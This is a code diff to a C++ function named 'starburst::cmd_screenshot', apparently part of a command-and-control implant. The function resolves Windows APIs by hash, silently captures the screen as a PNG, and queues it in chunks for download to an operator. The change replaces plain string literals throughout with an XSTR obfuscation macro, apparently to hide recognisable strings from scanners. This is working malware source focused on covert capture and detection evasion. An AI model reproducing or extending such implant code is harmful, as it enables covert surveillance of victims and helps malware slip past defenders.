@@ -77,7 +77,7 @@ auto declfn starburst::cmd_screenshot(
 
     if ( !h_user32 || !h_gdi32 || !h_gdiplus || !h_ole32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load user32/gdi32/gdiplus/ole32" ) ) );
+            XSTR( "failed to load user32/gdi32/gdiplus/ole32" ) );
         return;
     }
 
@@ -136,31 +136,30 @@ auto declfn starburst::cmd_screenshot(
         resolve::_api( inst.kernel32.handle, expr::hash_string( "GlobalUnlock" ) ) );
 
     const char* miss = nullptr;
-    if      ( !pGetSystemMetrics )            miss = "GetSystemMetrics";
-    else if ( !pGetDC )                       miss = "GetDC";
-    else if ( !pReleaseDC )                   miss = "ReleaseDC";
-    else if ( !pCreateCompatibleDC )          miss = "CreateCompatibleDC";
-    else if ( !pCreateCompatibleBitmap )      miss = "CreateCompatibleBitmap";
-    else if ( !pSelectObject )                miss = "SelectObject";
-    else if ( !pBitBlt )                      miss = "BitBlt";
-    else if ( !pGetDIBits )                   miss = "GetDIBits";
-    else if ( !pDeleteObject )                miss = "DeleteObject";
-    else if ( !pDeleteDC )                    miss = "DeleteDC";
-    else if ( !pGdiplusStartup )              miss = "GdiplusStartup";
-    else if ( !pGdiplusShutdown )             miss = "GdiplusShutdown";
-    else if ( !pGdipCreateBitmapFromGdiDib )  miss = "GdipCreateBitmapFromGdiDib";
-    else if ( !pGdipSaveImageToStream )       miss = "GdipSaveImageToStream";
-    else if ( !pGdipDisposeImage )            miss = "GdipDisposeImage";
-    else if ( !pCreateStreamOnHGlobal )       miss = "CreateStreamOnHGlobal";
-    else if ( !pGetHGlobalFromStream )        miss = "GetHGlobalFromStream";
-    else if ( !pGlobalSize )                  miss = "GlobalSize";
-    else if ( !pGlobalLock )                  miss = "GlobalLock";
-    else if ( !pGlobalUnlock )                miss = "GlobalUnlock";
+    if      ( !pGetSystemMetrics )            miss = XSTR("GetSystemMetrics");
+    else if ( !pGetDC )                       miss = XSTR("GetDC");
+    else if ( !pReleaseDC )                   miss = XSTR("ReleaseDC");
+    else if ( !pCreateCompatibleDC )          miss = XSTR("CreateCompatibleDC");
+    else if ( !pCreateCompatibleBitmap )      miss = XSTR("CreateCompatibleBitmap");
+    else if ( !pSelectObject )                miss = XSTR("SelectObject");
+    else if ( !pBitBlt )                      miss = XSTR("BitBlt");
+    else if ( !pGetDIBits )                   miss = XSTR("GetDIBits");
+    else if ( !pDeleteObject )                miss = XSTR("DeleteObject");
+    else if ( !pDeleteDC )                    miss = XSTR("DeleteDC");
+    else if ( !pGdiplusStartup )              miss = XSTR("GdiplusStartup");
+    else if ( !pGdiplusShutdown )             miss = XSTR("GdiplusShutdown");
+    else if ( !pGdipCreateBitmapFromGdiDib )  miss = XSTR("GdipCreateBitmapFromGdiDib");
+    else if ( !pGdipSaveImageToStream )       miss = XSTR("GdipSaveImageToStream");
+    else if ( !pGdipDisposeImage )            miss = XSTR("GdipDisposeImage");
+    else if ( !pCreateStreamOnHGlobal )       miss = XSTR("CreateStreamOnHGlobal");
+    else if ( !pGetHGlobalFromStream )        miss = XSTR("GetHGlobalFromStream");
+    else if ( !pGlobalSize )                  miss = XSTR("GlobalSize");
+    else if ( !pGlobalLock )                  miss = XSTR("GlobalLock");
+    else if ( !pGlobalUnlock )                miss = XSTR("GlobalUnlock");
 
     if ( miss ) {
         char err[80] = { 0 };
-        char prefix[] = { 'A','P','I',' ','r','e','s','o','l','v','e',' ',
-                          'f','a','i','l','e','d',':',' ', 0 };
+        xstr(prefix, "API resolve failed: ");
         int  ei = 0;
         for ( ; prefix[ei] && ei < 60; ei++ ) err[ei] = prefix[ei];
         for ( int j = 0; miss[j] && ei < 79; j++, ei++ ) err[ei] = miss[j];
@@ -188,7 +187,7 @@ auto declfn starburst::cmd_screenshot(
         pDeleteDC( h_mem );
         pReleaseDC( nullptr, h_screen );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -214,7 +213,7 @@ auto declfn starburst::cmd_screenshot(
     if ( pGdiplusStartup( &gdip_token, &startup_in, nullptr ) != 0 ) {
         inst.heap_free( pixel_buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GdiplusStartup failed" ) ) );
+            XSTR( "GdiplusStartup failed" ) );
         return;
     }
 
@@ -224,7 +223,7 @@ auto declfn starburst::cmd_screenshot(
         inst.heap_free( pixel_buf );
         pGdiplusShutdown( gdip_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GdipCreateBitmapFromGdiDib failed" ) ) );
+            XSTR( "GdipCreateBitmapFromGdiDib failed" ) );
         return;
     }
 
@@ -234,7 +233,7 @@ auto declfn starburst::cmd_screenshot(
         inst.heap_free( pixel_buf );
         pGdiplusShutdown( gdip_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateStreamOnHGlobal failed" ) ) );
+            XSTR( "CreateStreamOnHGlobal failed" ) );
         return;
     }
 
@@ -245,7 +244,7 @@ auto declfn starburst::cmd_screenshot(
         inst.heap_free( pixel_buf );
         pGdiplusShutdown( gdip_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GdipSaveImageToStream failed" ) ) );
+            XSTR( "GdipSaveImageToStream failed" ) );
         return;
     }
 
@@ -256,7 +255,7 @@ auto declfn starburst::cmd_screenshot(
         inst.heap_free( pixel_buf );
         pGdiplusShutdown( gdip_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetHGlobalFromStream failed" ) ) );
+            XSTR( "GetHGlobalFromStream failed" ) );
         return;
     }
 
@@ -270,7 +269,7 @@ auto declfn starburst::cmd_screenshot(
         inst.heap_free( pixel_buf );
         pGdiplusShutdown( gdip_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "empty PNG stream" ) ) );
+            XSTR( "empty PNG stream" ) );
         return;
     }
 
@@ -282,7 +281,7 @@ auto declfn starburst::cmd_screenshot(
         inst.heap_free( pixel_buf );
         pGdiplusShutdown( gdip_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -309,7 +308,7 @@ auto declfn starburst::cmd_screenshot(
     if ( slot < 0 ) {
         inst.heap_free( png_buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "too many pending downloads" ) ) );
+            XSTR( "too many pending downloads" ) );
         return;
     }
 
@@ -331,7 +330,7 @@ auto declfn starburst::cmd_screenshot(
         package_add_byte( inst, pkg, DOWNLOAD_INIT );
         package_add_int32( inst, pkg, total_chunks );
         package_add_int32( inst, pkg, total_size );
-        package_add_string( inst, pkg, symbol<char*>( const_cast<char*>( "screenshot.png" ) ) );
+        package_add_string( inst, pkg, XSTR( "screenshot.png" ) );
 
         uint32_t data_len = 0;
         auto data = package_build( pkg, &data_len );
